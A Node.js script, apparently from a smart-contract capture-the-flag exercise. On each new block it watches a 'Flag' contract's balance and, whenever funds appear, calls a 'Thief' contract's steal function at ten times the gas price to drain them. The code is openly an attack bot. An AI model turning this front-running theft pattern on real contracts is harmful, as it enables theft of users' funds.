#!/usr/bin/env node

const fs = require("fs");
const retryBluebird = require("retry-bluebird")

// Pass parameters to this script
//     - cohort folder
if (process.argv.length < 3) {
    console.error("Usage:", __filename, "/path/to/geth.ipc");
    process.exit(1);
}
const gethIpc = process.argv[2];

if (!fs.existsSync(gethIpc)) {
    console.error("File", gethIpc, "does not exist");
    process.exit(2);
}

const Promise = require("bluebird");
const BigNumber = require("bignumber.js");
const Web3 = require("web3");
const net = require("net");
const truffleContract = require("truffle-contract");
const ThiefJson = require("../build/contracts/Thief.json");
const Thief = truffleContract(ThiefJson);
const FlagJson = require("../build/contracts/Flag.json");
const Flag = truffleContract(FlagJson);
const sequentialPromiseNamed = require("../utils/sequentialPromiseNamed.js");

const prepareWeb3 = function() {
    if (!fs.existsSync(gethIpc)) {
        throw new Error("File", gethIpc, "does not exist");
    }
    const web3 = new Web3(new Web3.providers.IpcProvider(gethIpc, net));
    Promise.promisifyAll(web3.eth, { suffix: "Promise" });
    Thief.setProvider(web3.currentProvider);
    Flag.setProvider(web3.currentProvider);
    return web3;
};

const conditionalSteal = function(web3, flag, thief, account) {
    return web3.eth.getBalancePromise(flag.address)
        .then(balance => {
            if (new BigNumber(balance).isGreaterThan(0)) {
                return web3.eth.getGasPricePromise()
                    .then(gasPrice => thief.steal.sendTransaction(
                        flag.address, "mwahaha", { from: account, gasPrice: gasPrice.times(10) }))
                    .then(txHash => console.log("Balance:", balance.toString(10), ", stealing, tx:", txHash));
            } else {
                console.log("Balance:", balance.toString(10), ", waiting");
            }
        });
};

const watchToSteal =function(web3, flag, thief, account) {
    return conditionalSteal(web3, flag, thief, account)
        .then(() => new Promise((resolve, reject) => {
                const filter = web3.eth.filter("latest");
                console.log("Started watching Flag", flag.address);
                filter.watch((error, result) => {
                    if (error != null) {
                        filter.stopWatching(() => reject(error));
                    } else {
                        console.log("Latest block:", result);
                        return conditionalSteal(web3, flag, thief, account)
                            .catch(console.error);
                    }
                });
        }));
};

let goCount = 0;

const oneGoWatchToSteal = function() {
    console.log(new Date(), "Launching Go", goCount++);
    return Promise.try(() => prepareWeb3())
        .then(web3 => sequentialPromiseNamed({
                thief: () => Thief.deployed(),
                flag: () => Flag.deployed(),
                account: () => web3.eth.getAccountsPromise().then(accounts => accounts[0])
            })
            .then(elements => watchToSteal(web3, elements.flag, elements.thief, elements.account))
        )
        .catch(e => {
            console.error(e);   
            throw e;
        });
};

retryBluebird(
    { max: 9999999, backoff: 5000 },
    oneGoWatchToSteal);